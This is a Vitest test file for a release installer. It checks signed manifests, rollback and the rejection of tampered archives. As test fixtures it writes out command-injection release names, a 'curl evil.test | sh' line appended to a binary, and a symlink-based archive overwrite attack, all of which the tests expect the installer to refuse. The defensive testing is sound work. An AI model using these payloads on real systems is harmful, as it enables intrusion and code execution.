import { execFileSync, spawnSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { installRelease, rollbackRelease, stageArchive } from '../scripts/install-release.mjs';
import { manifestDigest, signManifest, sshVerify, writeManifest, type Entry, type Verify } from '../scripts/release-manifest.mjs';
import { PINS } from '../scripts/release-stage.mjs';

const dirs: string[] = [];
afterEach(() => { for (const d of dirs.splice(0)) fs.rmSync(d, { recursive: true, force: true }); });

const temp = (): string => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'archi-install-release-'));
  dirs.push(dir);
  return dir;
};

/** A miniature release tree under `<root>/releases/<version>`, whose bin/archi says which build it is. */
function tree(version: string, build = version): string {
  const root = temp();
  const dir = path.join(root, 'releases', version);
  fs.mkdirSync(path.join(dir, 'bin'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'bin', 'archi'), `#!/bin/sh\necho ${build}\n`, { mode: 0o755 });
  writeManifest(dir, { version, platform: 'linux-x64' });
  return dir;
}

function signer(): { key: string; verify: Verify } {
  const dir = temp();
  const key = path.join(dir, 'key');
  execFileSync('ssh-keygen', ['-q', '-t', 'ed25519', '-N', '', '-C', 'archipelago-release', '-f', key]);
  const allowed = path.join(dir, 'allowed_signers');
  const pub = fs.readFileSync(`${key}.pub`, 'utf8').split(' ').slice(0, 2).join(' ');
  fs.writeFileSync(allowed, `archipelago-release namespaces="archipelago-release" ${pub}\n`);
  return { key, verify: sshVerify({ allowedSigners: allowed }) };
}

// as the release builds pack one, so a Linux tar finds no AppleDouble member the Mac's bsdtar would add
const pack = (root: string, members: string[] = ['releases']): string => {
  const archive = path.join(temp(), 'release.tar.gz');
  execFileSync('tar', ['--no-xattrs', '-czf', archive, '-C', root, ...members], { env: { ...process.env, COPYFILE_DISABLE: '1' } });
  return archive;
};
const archiveOf = (dir: string): string => pack(path.dirname(path.dirname(dir)));

const install = (source: string, prefix: string) => installRelease({ source, prefix, allowUnsigned: true });
const build = (prefix: string): string => execFileSync(path.join(prefix, 'current', 'bin', 'archi'), { encoding: 'utf8' }).trim();

describe('what an install keeps to go back to', () => {
  it('names the release before a same-named reinstall, never the tree the reinstall replaced', () => {
    const prefix = temp();
    const before = install(tree('0.9.0'), prefix);
    install(tree('1.0.0', 'first build'), prefix);
    const again = install(tree('1.0.0', 'second build'), prefix);
    expect(again.replaced).toBe(true);
    expect(build(prefix)).toBe('second build');
    expect(again.rollbackTo).toBe(before.release);
    expect(again.releasesKept).toEqual(['0.9.0', '1.0.0']);
    rollbackRelease(prefix, again.rollbackTo!);
    expect(build(prefix)).toBe('0.9.0');
  });

  it('has nothing to go back to when the only release there was is reinstalled over itself', () => {
    const prefix = temp();
    install(tree('1.0.0', 'first build'), prefix);
    const again = install(tree('1.0.0', 'second build'), prefix);
    expect(again.rollbackTo).toBeNull();
    expect(again.releasesKept).toEqual(['1.0.0']);
  });
});

describe('staging a release archive', () => {
  it('checks the signature over its SHA256SUMS once, before anything else leaves the archive, then every file', () => {
    const key = signer();
    const dir = tree('1.2.3');
    signManifest(dir, key.key);
    const seen: string[][] = [];
    const verify: Verify = (d, s) => { seen.push(fs.readdirSync(d).sort()); key.verify(d, s); };
    const staged = stageArchive(archiveOf(dir), path.join(temp(), 'staging'), { verify });
    expect(seen).toEqual([['SHA256SUMS', 'SHA256SUMS.sig']]);
    expect(staged).toMatchObject({ version: '1.2.3', signed: true, release: { version: '1.2.3', platform: 'linux-x64' } });
    expect(fs.readFileSync(path.join(staged.dir, 'bin', 'archi'), 'utf8')).toContain('1.2.3');
  });

  it('refuses a release name no installer takes before it unpacks anything', () => {
    for (const version of ['a b', '$(touch x)', 'v1;rm']) {
      const staging = path.join(temp(), 'staging');
      expect(() => stageArchive(archiveOf(tree(version)), staging, { allowUnsigned: true })).toThrow(`names its release ${JSON.stringify(version)}, which no installer takes`);
      expect(fs.existsSync(path.join(staging, 'releases'))).toBe(false);
    }
  });

  it('refuses an archive with no release.json of its own', () => {
    const dir = tree('1.2.3');
    fs.rmSync(path.join(dir, 'release.json'));
    expect(() => stageArchive(archiveOf(dir), path.join(temp(), 'staging'), { allowUnsigned: true })).toThrow(/carries no releases\/1\.2\.3\/release\.json/);
  });

  it('refuses a file changed after the manifest was written, and a release.json naming another release', () => {
    const changed = tree('1.2.3');
    fs.appendFileSync(path.join(changed, 'bin', 'archi'), 'curl evil.test | sh\n');
    expect(() => stageArchive(archiveOf(changed), path.join(temp(), 'staging'), { allowUnsigned: true })).toThrow(/bin\/archi: expected/);
    const renamed = tree('1.2.3');
    writeManifest(renamed, { version: '1.2.4', platform: 'linux-x64' });
    expect(() => stageArchive(archiveOf(renamed), path.join(temp(), 'staging'), { allowUnsigned: true })).toThrow(/unpacks as 1\.2\.3 but its release\.json says 1\.2\.4/);
  });

  it('refuses an archive holding a member outside its release, spelled other than as a path in it, or twice', () => {
    const root = path.dirname(path.dirname(tree('1.2.3')));
    fs.writeFileSync(path.join(root, 'run-me.sh'), '#!/bin/sh\n');
    for (const [extra, said] of [
      ['./releases/1.2.3/SHA256SUMS', 'holds "./releases/1.2.3/SHA256SUMS", which is not a path in releases/1.2.3'],
      ['run-me.sh', 'holds "run-me.sh", which is not a path in releases/1.2.3'],
      ['releases/1.2.3/SHA256SUMS', 'holds "releases/1.2.3/SHA256SUMS" twice'],
    ]) {
      const staging = path.join(temp(), 'staging');
      expect(() => stageArchive(pack(root, ['releases', extra]), staging, { allowUnsigned: true }), extra).toThrow(said);
      expect(fs.existsSync(path.join(staging, 'releases')), extra).toBe(false);
    }
  });

  it('installs an archive through it, name check first', () => {
    const prefix = temp();
    expect(() => install(archiveOf(tree('a b')), prefix)).toThrow('names its release "a b", which no installer takes');
    expect(install(archiveOf(tree('1.2.3')), prefix)).toMatchObject({ version: '1.2.3', signed: false });
    expect(build(prefix)).toBe('1.2.3');
  });
});

// GNU tar writes a member under a link inside the release over a file it extracted by name, where the Mac's bsdtar refuses
// the link, so this runs on a Linux image with GNU tar and ssh-keygen, such as archi-it:machine, with the Node runtime
// the release build keeps under vendor/
const gnuTar = process.env.ARCHI_TEST_GNU_TAR;

describe.skipIf(!gnuTar)('staging under GNU tar (set ARCHI_TEST_GNU_TAR=<docker image> to run)', () => {
  const docker = (...argv: string[]) => spawnSync('docker', argv, { encoding: 'utf8', timeout: 120_000 });

  it('refuses an archive whose members write over the SHA256SUMS its signature was checked over, through a link in the release', () => {
    const key = signer();
    const genuine = tree('1.2.3');
    signManifest(genuine, key.key);
    // the intruder's own manifest lists the link as a Linux tree has it, so only the SHA256SUMS the signature was
    // checked over stands between its files and the install
    const intruder = tree('1.2.3', 'intruder');
    fs.symlinkSync('.', path.join(intruder, 'd'));
    writeManifest(intruder, { version: '1.2.3', platform: 'linux-x64' });
    const manifest = JSON.parse(fs.readFileSync(path.join(intruder, 'release.json'), 'utf8')) as { files: Entry[] };
    manifest.files.find((e) => e.path === 'd')!.mode = '777';
    fs.writeFileSync(path.join(intruder, 'release.json'), JSON.stringify({ ...manifest, entriesDigest: manifestDigest(manifest.files) }));
    const digest = crypto.createHash('sha256').update(fs.readFileSync(path.join(intruder, 'release.json'))).digest('hex');
    const sums = path.join(intruder, 'SHA256SUMS');
    fs.writeFileSync(sums, fs.readFileSync(sums, 'utf8').replace(/^[0-9a-f]{64}  release\.json$/m, `${digest}  release.json`));
    const root = path.dirname(path.dirname(genuine));
    fs.symlinkSync('.', path.join(genuine, 'd'));
    const through = temp();
    fs.cpSync(intruder, path.join(through, 'releases', '1.2.3', 'd'), { recursive: true });
    const files = fs.readdirSync(path.join(through, 'releases'), { recursive: true, withFileTypes: true })
      .filter((e) => e.isFile()).map((e) => path.relative(through, path.join(e.parentPath, e.name)));
    const work = temp();
    const archive = path.join(work, 'release.tar.gz');
    execFileSync('tar', ['--no-xattrs', '-czf', archive, '-C', root, 'releases', '-C', through, ...files], { env: { ...process.env, COPYFILE_DISABLE: '1' } });
    fs.copyFileSync(path.join(path.dirname(key.key), 'allowed_signers'), path.join(work, 'allowed_signers'));
    fs.writeFileSync(path.join(work, 'stage.mjs'), `import { stageArchive } from '/work/scripts/install-release.mjs';
import { sshVerify } from '/work/scripts/release-manifest.mjs';
try {
  stageArchive('/work/release.tar.gz', '/work/staging', { verify: sshVerify({ allowedSigners: '/work/allowed_signers' }) });
  console.log('staged');
} catch (e) { console.log(e.message); }
`);
    fs.mkdirSync(path.join(work, 'scripts'));
    for (const f of ['install-release.mjs', 'release-manifest.mjs']) fs.copyFileSync(path.join(import.meta.dirname, '../scripts', f), path.join(work, 'scripts', f));

    const box = `archi-stage-${process.pid}`;
    expect(docker('run', '-d', '--rm', '--name', box, gnuTar!, 'sleep', '300').status).toBe(0);
    try {
      const arch = docker('exec', box, 'uname', '-m').stdout.trim() === 'x86_64' ? 'x64' : 'arm64';
      const name = `node-${PINS.node.version}-linux-${arch}`;
      execFileSync('tar', ['-xJf', path.join(import.meta.dirname, '../vendor/node', `${name}.tar.xz`), '-C', work, `${name}/bin/node`]);
      fs.renameSync(path.join(work, name, 'bin', 'node'), path.join(work, 'node'));
      fs.rmSync(path.join(work, name), { recursive: true });
      expect(docker('cp', `${work}/.`, `${box}:/work`).status).toBe(0);
      const said = docker('exec', box, '/work/node', '/work/stage.mjs');
      expect(said.stderr).toBe('');
      expect(said.stdout.trim()).toMatch(/writes over the SHA256SUMS its signature was checked over/);
      // what the link wrote, as GNU tar wrote it
      expect(docker('exec', box, 'cat', '/work/staging/releases/1.2.3/bin/archi').stdout).toContain('intruder');
    } finally {
      docker('rm', '-f', box);
    }
  });
});
